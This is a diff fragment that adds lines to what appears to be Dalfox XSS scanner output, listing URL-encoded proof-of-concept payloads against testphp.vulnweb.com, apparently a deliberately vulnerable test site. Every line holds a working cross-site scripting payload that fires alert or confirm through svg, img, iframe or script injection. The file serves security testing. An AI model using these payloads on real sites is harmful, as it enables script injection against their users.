@@ -8695,3 +8695,7 @@
 [POC][R][GET][inHTML] http://testphp.vulnweb.com:80/Mod_Rewrite_Shop/RateProduct-1.html?id=%3E%3Csvg%3E%3CforeignObject%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%3C%2FforeignObject%3E
 [POC][V][GET][inHTML] http://testphp.vulnweb.com:80/Mod_Rewrite_Shop/RateProduct-1.html?id=%22%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
 [POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/?pp=12User-Agent%3A%27%22%3E%3Csvg%2Fclass%3Ddalfox+onload%3D%26%2397%26%23108%26%23101%26%23114%26%2300116%26%2340%26%2341%26%23x2f%26%23x2f
+[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/?gt=&pp=%27%22%3E%3CIMG+SRC%3Dx+onprogress%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E
+[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=valid%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez&pp=%3CscRipt%3Ealert%280x107FBD
+[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=valid%22%3E%3CIMG+SRC%3Dx+onsearch%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&pp=%3CscRipt%3Ealert%280x107FBD
+[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=valid&pp=%3CscRipt%3Ealert%280x107FBD%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E-%2526apos%3B
